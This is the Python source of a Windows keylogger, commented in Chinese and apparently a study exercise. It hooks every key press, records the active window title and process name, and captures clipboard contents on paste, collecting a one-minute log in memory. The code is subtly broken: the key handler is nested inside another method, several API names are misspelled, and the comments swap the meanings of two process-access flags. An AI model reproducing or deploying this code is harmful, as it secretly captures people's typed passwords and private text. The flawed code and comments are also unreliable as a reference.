import sys
import time
from ctypes import windll, c_ulong, byref, create_string_buffer
from io import StringIO
import pythoncom
import win32clipboard
import pyWinhook as pyHook

# windll: call functions from DLLs using the ctypes library
# c_ulong: 32-bit unsigned integer 
# byref: 告訴使用者，不是把玩具直接給別人，而是告訴他們在哪裡可以找到這個玩具一樣。

# 設置抓取 1 分鐘
TIMEOUT = 60*1

class KeyLogger:
    def __init__(self):
        self.current_window = None
    def get_current_process(self):
        # 獲取活躍窗口
        hwnd = windll.user32.GetForegroundWindow()
        # 獲取窗口對應的進程 ID
        pid = c_ulong(0)
        windll.user32.GetWindowThreadProcessId(hwnd, byref(pid))
        process_id = f"{pid.value}"

        # a buffer of 512 characters is created, likely to store the executable (program) name.    
        executable = create_string_buffer(512)
        # 打開 process
        # 0x400 | 0x10 indicate that the process handle should have permissions for reading memory (0x10) and querying information (0x400).
        # 0x400 in hexadecimal is equivalent to 1024 in decimal.
        # 0x10 in hexadecimal is equivalent to 16 in decimal.
        # 0x400: PROCESS_VM_READ flag, indicating permission to read the virtual memory of a process.
        # 0x10: PROCESS_QUERY_INFORMATION, indicating permission to query information about a process.
        # False: whether the handle can be inherited by child processes 
        h_process = windll.kernel32.OpenProcess(0x400 | 0x10, False, pid)
        # 利用打開的 process handle，找到 process 實際的程式名。
        # None: represents a handle to the loaded module (i.e., the executable itself)
        # byref(executable): allows the C function to write data into this buffer.
        windll.psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512)

        # 抓取窗口標題
        window_title = create_string_buffer(512)
        windll.user32.getWindowTextA(hwnd,byref(window_title),512)
        try:
            # gbk => utf-8 or big5
            self.current_window = window_title.value.decode('big5')
        except UnicodeDecodeError as e:
            print(f"{e}: window name nukonwn")

        # 將所有抓取到的所有資訊列印出來
        # executable.value.decode(): executable (program) name
        # self.current_window: title
        print('\n', process_id, executable.value.decode(), self.current_window)
        # 控制代碼（handle）是Windows作業系統用來標識被應用程式所建立或使用的對象的整數。
        # 控制代碼 (handle) 是 windows 作業系統用來標識被應用程式所建立或使用的對象的整數
        # 也就是魔法棒的按鈕，可以用來控制電腦的各種事物
        windll.kernel32.CloseHandle(hwnd)
        windll.kernel32.CloseHandle(h_process)

        def mykeystoke(self, event):
            # 檢查用戶是否切換了窗口
            if event.WindowName != self.current_window:
                self.get_current_process()
            # 判斷按鍵是否可列印字符, space ~ DEL
            if 32 < event.Ascii < 127:
                print(chr(event.Ascii), end='')
            else:
                # 檢查用戶是否為可打印的字符
                if event.key == 'V':
                    win32clipboard.OpenClipboardData()
                    value = win32clipboard.GetClipboardData()
                    win32clipboard.CloseClipboard()
                    print(f"[PASTE] - {value}")
                else:
                    print(f"{event.key}")

            return True
        
def run():
    # 把原本系統的輸出方式保存到 'save_stdout' 這個變數中。
    save_stdout = sys.stdout
    #  把系統的輸出方式改到記憶體中的容器，可以暫時記錄下所有輸出的內容，程式執行期間，
    #  原本要輸出到螢幕上的東西都會被記錄在 'StringIO()' 中。
    sys.stdout = StringIO()

    k1 = KeyLogger()
    # 處理鍵盤事件的函式
    hm = pyHook.HookManager()
    # 將 KeyDown 事件綁定到 mykeystorky 的回調函數中
    hm.KeyDown = k1.mykeystorke
    # 勾住所有的按鍵事件
    hm.HookKeyboard()

    
    # 再等一個很重要的郵件，但不想一直盯著信箱，所以決定先做其他事情，
    # 但是每隔一段時間(TIMEOUT)去看有沒有郵件(pythoncom.PumpWatingMessages())，可以同時處理不同的事
    # time.sleep(10): 等待某個事件的完成，例如下載檔案，程式會暫停不做任何事情。
    while time.thread_time() < TIMEOUT:
        pythoncom.PumpWatingMessages()

    # 把這段期間記錄下來的所有內容取出來，存在 'log' 變數中。
    log = sys.stdout.getvalue()
    # 把輸出方式還原成原本的樣子，就好像什麼事都沒發生過
    sys.stdout = save_stdout
    # 把記錄下來的內容回傳給呼叫這個函式的地方
    return log

if __name__ == '__main__':
    print(run())
    print('done.')


'''
保存原本的輸出方式：

save_stdout = sys.stdout：把原本系統的輸出方式保存到 save_stdout 這個變數中。
設定輸出到記憶體中：

sys.stdout = StringIO()：把系統的輸出方式改成一個特別的地方，這個地方是一個在記憶體中的容器，可以暫時記錄下所有輸出的內容。
在這個新的輸出方式下執行一些程式：

在這段程式碼執行期間，所有原本要輸出到螢幕上的東西都會被記錄在 StringIO() 中。
取得記錄的內容：

log = sys.stdout.getvalue()：把在這段期間記錄下來的所有內容取出來，存在 log 這個變數中。
還原原本的輸出方式：

sys.stdout = save_stdout：把輸出方式還原成原本的樣子，就好像什麼都沒發生過一樣。
回傳記錄的內容：

return log：把記錄下來的內容回傳給呼叫這個函式的地方。
'''

'''
class KeyLogger:
    def mykeystorke(self, event):
        print('Key:', event.Key)
        return True  # 必須返回 True，否則鍵盤事件將被阻止

# 創建 KeyLogger 實例
k1 = KeyLogger()

# 創建一個 HookManager
hook_manager = pyHook.HookManager()

# 設定鍵盤事件的處理函式
hook_manager.KeyDown = k1.mykeystorke

# 設置監聽
hook_manager.HookKeyboard()

# 處理事件的主迴圈
pythoncom.PumpMessages()

在這個例子中，KeyLogger 類別的 mykeystorke 方法被設置為 hook_manager.KeyDown，這樣當鍵盤按鍵被按下時，mykeystorke 方法就會被調用。這種結構可以更好地組織程式碼，將不同功能的邏輯切分為不同的類別或模組。
'''